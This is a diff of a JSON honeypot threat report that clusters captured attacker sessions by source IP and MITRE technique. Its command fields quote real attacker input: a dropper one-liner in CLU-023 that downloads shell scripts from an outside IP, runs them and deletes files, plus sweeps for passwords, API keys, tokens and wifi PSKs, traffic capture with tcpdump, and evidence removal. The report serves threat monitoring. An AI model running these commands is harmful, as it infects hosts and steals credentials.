@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-07-13T22:58:21.825401+00:00",
-  "total_sessions_with_commands": 9,
-  "total_clusters": 4,
+  "generated_at": "2026-07-14T02:46:49.046656+00:00",
+  "total_sessions_with_commands": 34,
+  "total_clusters": 26,
   "campaign_clusters": 1,
-  "singleton_clusters": 3,
+  "singleton_clusters": 22,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 6,
+      "unique_ip_count": 6,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -31,82 +31,29 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "104.225.250.214"
+        "27.42.87.156"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "c74cbeb6eac6dc54",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        },
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        }
-      ],
+      "sequence_hash": "310cc1b4220e5c90",
+      "ttps": [],
       "representative_commands": [
-        "/ip cloud print",
-        "ifconfig",
-        "uname -a",
-        "cat /proc/cpuinfo",
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
-        "locate D877F783D5D3EF8Cs",
-        "echo Hi | cat -n"
+        "which tcpdump 2>/dev/null || (sudo apt-get update -qq && sudo apt-get install -y -qq tcpdump 2>/dev/null) || true",
+        "sudo apt-get update -qq",
+        "sudo apt-get install -y -qq tcpdump 2 > /dev/null"
       ],
       "members": [
         {
-          "session_id": "IR-07a7663fc5f2",
-          "src_ip": "104.225.250.214",
-          "country": "US",
-          "isp": "Fiberhub",
-          "command_count": 9,
-          "timestamp": "2026-07-13T22:13:31.480816Z"
+          "session_id": "IR-d8938b23f887",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 3,
+          "timestamp": "2026-07-14T00:09:10.332484Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "35.203.210.127"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "49efc5eb7bb5604b",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        }
-      ],
-      "representative_commands": [
-        "User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
-        "Accept-Encoding: gzip"
-      ],
-      "members": [
-        {
-          "session_id": "IR-10bc6c47e65d",
-          "src_ip": "35.203.210.127",
-          "country": "GB",
-          "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-07-13T21:15:30.854587Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -125,11 +72,16 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 6,
       "unique_ips": [
-        "189.146.59.77"
+        "103.59.94.61",
+        "37.77.150.241",
+        "124.156.129.246",
+        "45.207.196.123",
+        "213.108.3.171",
+        "69.73.187.130"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 6,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -159,12 +111,80 @@
       ],
       "members": [
         {
-          "session_id": "IR-ef3ce242d1b3",
-          "src_ip": "189.146.59.77",
-          "country": "MX",
-          "isp": "Gesti\u00f3n de direccionamiento UniNet",
+          "session_id": "IR-14b115c0db5a",
+          "src_ip": "124.156.129.246",
+          "country": "HK",
+          "isp": "Asia Pacific Network Information Centre",
           "command_count": 2,
-          "timestamp": "2026-07-13T22:21:34.006623Z"
+          "timestamp": "2026-07-14T00:31:26.979771Z"
+        },
+        {
+          "session_id": "IR-e4d088e2846c",
+          "src_ip": "45.207.196.123",
+          "country": "HK",
+          "isp": "Vapeline Technology",
+          "command_count": 2,
+          "timestamp": "2026-07-14T00:33:24.090126Z"
+        },
+        {
+          "session_id": "IR-b97b081388f8",
+          "src_ip": "69.73.187.130",
+          "country": "US",
+          "isp": "NETWORK TRANSIT HOLDINGS LLC",
+          "command_count": 2,
+          "timestamp": "2026-07-14T00:34:26.980777Z"
+        },
+        {
+          "session_id": "IR-995c3c6ed6cc",
+          "src_ip": "213.108.3.171",
+          "country": "US",
+          "isp": "Baykov Ilya Sergeevich",
+          "command_count": 2,
+          "timestamp": "2026-07-14T00:38:48.633839Z"
+        },
+        {
+          "session_id": "IR-b9f9849cfa10",
+          "src_ip": "103.59.94.61",
+          "country": "ID",
+          "isp": "PT Lakuloka Digital Indonesia",
+          "command_count": 2,
+          "timestamp": "2026-07-14T00:48:49.852569Z"
+        },
+        {
+          "session_id": "IR-dcf16a592279",
+          "src_ip": "37.77.150.241",
+          "country": "RU",
+          "isp": "Proton66 OOO",
+          "command_count": 2,
+          "timestamp": "2026-07-14T00:53:45.160167Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7063dece7cccf374",
+      "ttps": [],
+      "representative_commands": [
+        "hostname"
+      ],
+      "members": [
+        {
+          "session_id": "IR-e8f8c96b69b4",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:06.607080Z"
         }
       ]
     },
@@ -175,7 +195,595 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 6,
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "28ba533b0f3c4df6",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -a"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b4ddc6cf0ec9",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:09.580562Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "87ff0ffc6ba6a952",
+      "ttps": [],
+      "representative_commands": [
+        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"
+      ],
+      "members": [
+        {
+          "session_id": "IR-9e40dad8e3b3",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:12.676661Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "bf12b043b26d1d9e",
+      "ttps": [],
+      "representative_commands": [
+        "ps aux --no-headers 2>/dev/null"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c11de8d32562",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:15.861497Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "ac97ccade537bc81",
+      "ttps": [],
+      "representative_commands": [
+        "ps aux --no-headers | grep -v 'grep\\|ssh\\|bash.*which\\|bash.*ls\\|bash.*pgrep' | grep -iE 'squid|3proxy|tinyproxy|dante|sockd|privoxy|polipo|haproxy|nginx.*stream|redsocks|sshuttle|tor\\b|mitmproxy|mitmdump|shadowsocks|ss-server|ss-local|v2ray|xray|clash|frps|frpc|ngrok|iodine|iodined|dnscat2|socat.*TCP|rinetd|gost|brook|openvpn|wireguard|wg\\b'"
+      ],
+      "members": [
+        {
+          "session_id": "IR-679620ebdb26",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:19.348375Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "5e81ab3eb6fd0786",
+      "ttps": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'Password\\s*=' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-4ed6b4d5ba30",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:22.864892Z"
+        },
+        {
+          "session_id": "IR-2bf589f36ee0",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:29.201668Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-009",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "e74148b8c449db2e",
+      "ttps": [],
+      "representative_commands": [
+        "grep -iE 'Password\\s*=' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-a2b88bba821f",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:26.087624Z"
+        },
+        {
+          "session_id": "IR-55b2e4e330e9",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:32.126578Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-010",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "da1ca78647744848",
+      "ttps": [
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'passwd\\s*=' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f7a7839a083f",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:35.471668Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-011",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "9e2e1915a61fa5f9",
+      "ttps": [
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        }
+      ],
+      "representative_commands": [
+        "grep -iE 'passwd\\s*=' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-830fee0be4c9",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:38.617512Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-012",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "3b21ffc6f213fa9e",
+      "ttps": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'secret\\s*=' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-cdf37ee2f247",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:41.823503Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-013",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "a5b140fad0aeb388",
+      "ttps": [],
+      "representative_commands": [
+        "grep -iE 'secret\\s*=' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-e556d3b0781f",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:45.209631Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-014",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "09fdf0826b5734f8",
+      "ttps": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'api[_-]?key\\s*[=:]' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-6d52a8cee428",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:48.592754Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-015",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "3444b5401abe83c9",
+      "ttps": [],
+      "representative_commands": [
+        "grep -iE 'api[_-]?key\\s*[=:]' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-723d6b2f028e",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:51.668206Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-016",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "ab6c06cfc397b215",
+      "ttps": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'token\\s*[=:].{8,}' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-824b5755bd30",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:54.824155Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-017",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "9061fb0da7d62ada",
+      "ttps": [],
+      "representative_commands": [
+        "grep -iE 'token\\s*[=:].{8,}' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-be7f27da8f99",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:08:58.038598Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-018",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "e3e4eb79de61dc6c",
+      "ttps": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell"
+        },
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "find /etc /home/pi -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.env' -o -name '*.sh' \\) ! -path '*/chromium/*' ! -path '*/mozilla/*' ! -path '*/Extensions/*' -exec grep -liE 'Basic\\s+[A-Za-z0-9+/=]{16,}' {} \\; 2>/dev/null | head -15"
+      ],
+      "members": [
+        {
+          "session_id": "IR-05f45503cbd9",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:09:01.027896Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-019",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "5e2afc3455cc1fde",
+      "ttps": [],
+      "representative_commands": [
+        "grep -iE 'Basic\\s+[A-Za-z0-9+/=]{16,}' '-bash: syntax error near unexpected token `('\\n' 2>/dev/null | grep -ivE '^(#|//|;|REM|\\s*\\*)' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-07e9d04bc3e5",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:09:04.283291Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-020",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "38f9a57787fa0ba6",
+      "ttps": [],
+      "representative_commands": [
+        "sudo grep -h 'psk=' /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null | grep -v '^#' | head -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-fae1be1b6c47",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:09:07.199868Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-021",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "71c6000ec6bab111",
+      "ttps": [],
+      "representative_commands": [
+        "sudo timeout 300 tcpdump -i any -w /tmp/cap_129.80.119.236_22.pcap 'tcp' 2>/dev/null; true"
+      ],
+      "members": [
+        {
+          "session_id": "IR-2c23dd37ac45",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:09:13.754134Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-022",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
       "unique_ips": [
         "185.242.3.195"
       ],
@@ -187,52 +795,150 @@
       ],
       "members": [
         {
-          "session_id": "IR-c26048e0cb2d",
+          "session_id": "IR-884f1d6722d0",
           "src_ip": "185.242.3.195",
           "country": "DE",
           "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-13T21:05:36.173045Z"
+          "timestamp": "2026-07-14T00:10:52.204829Z"
         },
         {
-          "session_id": "IR-de122727a051",
+          "session_id": "IR-fb0c8e93ac4b",
           "src_ip": "185.242.3.195",
           "country": "DE",
           "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-13T21:21:34.215132Z"
+          "timestamp": "2026-07-14T00:26:16.456059Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-023",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "94.154.43.230"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "1c4b54e6b3f14665",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
-          "session_id": "IR-c47368659115",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
-          "command_count": 1,
-          "timestamp": "2026-07-13T21:42:42.498802Z"
+          "id": "T1070",
+          "name": "Indicator Removal"
         },
         {
-          "session_id": "IR-6f11f3d7aad5",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
-          "command_count": 1,
-          "timestamp": "2026-07-13T21:58:32.112870Z"
-        },
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        }
+      ],
+      "representative_commands": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.92/nz.sh; curl -O http://41.216.189.92/nz.sh; chmod 777 nz.sh; sh nz.sh; tftp 41.216.189.92 -c get nz.sh; chmod 777 nz.sh; sh nz.sh; tftp -r 3.sh -g 41.216.189.92; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 41.216.189.92 2.sh 2.sh; sh 2.sh; rm -rf nz.sh nz.sh 3.sh 2.sh; rm -rf *"
+      ],
+      "members": [
         {
-          "session_id": "IR-a4f91e2b5af4",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
+          "session_id": "IR-a9422d6c96db",
+          "src_ip": "94.154.43.230",
+          "country": "TR",
+          "isp": "Storm Industries LLC",
           "command_count": 1,
-          "timestamp": "2026-07-13T22:20:01.450382Z"
-        },
+          "timestamp": "2026-07-14T00:12:52.604936Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-024",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "eb4ffc059ed668f1",
+      "ttps": [],
+      "representative_commands": [
+        "sudo tcpdump -r /tmp/cap_129.80.119.236_22.pcap -A 2>/dev/null | strings"
+      ],
+      "members": [
         {
-          "session_id": "IR-b824e75c35fa",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
+          "session_id": "IR-a46da2bc2ccb",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
           "command_count": 1,
-          "timestamp": "2026-07-13T22:36:21.528915Z"
+          "timestamp": "2026-07-14T00:14:47.107374Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-025",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.42.87.156"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "5cbd0de236bbabb7",
+      "ttps": [],
+      "representative_commands": [
+        "sudo rm -f /tmp/cap_129.80.119.236_22.pcap"
+      ],
+      "members": [
+        {
+          "session_id": "IR-bd6f20b9ced7",
+          "src_ip": "27.42.87.156",
+          "country": "CN",
+          "isp": "China Unicom Guangdong province network",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:14:50.190985Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-026",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "2.58.172.185"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7ab552f01de999cb",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b7b09d4b37fa",
+          "src_ip": "2.58.172.185",
+          "country": "GB",
+          "isp": "rack400.com - UK Infrastructure Tel : +6531595852",
+          "command_count": 1,
+          "timestamp": "2026-07-14T00:41:28.735297Z"
         }
       ]
     }
